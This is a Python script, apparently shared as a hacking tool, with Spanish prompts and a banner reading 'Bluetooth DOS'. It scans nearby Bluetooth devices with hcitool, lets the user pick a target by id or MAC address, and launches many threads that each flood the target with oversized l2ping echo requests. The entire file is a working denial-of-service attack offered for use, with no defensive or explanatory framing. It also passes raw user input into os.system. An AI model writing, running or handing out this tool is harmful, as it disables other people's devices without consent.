import os
import threading
import time
import subprocess
def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def printLogo():
    print('')
    print('')
    print('                                   Bluetooth DOS                            ')
    print(' ___              _           _                  _        ')
    print('(  _`\           ( )       _ ( )_               ( )     _')
    print('| |_) )  __     _| | _ __ (_)|  _)   _      ___ | |___ (_)')
    print('|  __/ / __ \ / _  |(  __)| || |   / _ \  / ___)|  _  \| |')
    print('| |   (  ___/( (_| || |   | || |_ ( (_) )( (___ | | | || |')
    print('| |   (  ___/( (_| || |   | || |_ ( (_) )( (___ | | | || |')
    print('(_)    \____) \__ _)(_)   (_) \__) \___/  \____)(_) (_)(_)')
    print('\x1b[0m')
    print("creado por pedritochi")

def main():
    printLogo()
    time.sleep(0.1)
    print('')
    print('\x1b[31mQuieres iniciar el programa?')
    if (input(" (y/n) > ") in ['y', 'Y']):
        time.sleep(0.1)
        os.system('clear')
        printLogo()
        print('')
        print("Escaneando...")
        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
        lines = output.splitlines()
        id = 0
        del lines[0]
        array = []
        print("|id   |   direccion_mac  |   nombre del dispositivo|")
        for line in lines:
            info = line.split()
            mac = info[0]
            array.append(mac)
            print(f"|{id}   |   {mac}  |   {''.join(info[1:])}|")
            id = id + 1
        target_id = input('Objetivo en id o MAC > ')
        try:
            target_addr = array[int(target_id)]
        except:
            target_addr = target_id


        if len(target_addr) < 1:
            print('[!] ERROR: Falta la direccion mac')
            exit(0)

        try:
            packages_size = int(input('Tamaño de los paquetes > '))
        except:
            print('[!] ERROR')
            exit(0)
        try:
            threads_count = int(input('Hilos > '))
        except:
            print('[!] ERROR')
            exit(0)
        print('')
        os.system('clear')

        print("\x1b[31m[*] Iniciando ataque DOS en 3 segundos")

        for i in range(0, 3):
            print('[*] ' + str(3 - i))
            time.sleep(1)
        os.system('clear')
        print('[*] Cargando los hilos...\n')
        print('[*] CARGADOS')

        for i in range(0, threads_count):
            print('[*] Built thread №' + str(i + 1))
            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

        print('[*] Cargando los hilos...')
        print('[*] CARGADOS')
        print('[*] INICIANDO...')
    else:
        print('Bip bip')
        exit(0)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Abortado')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))
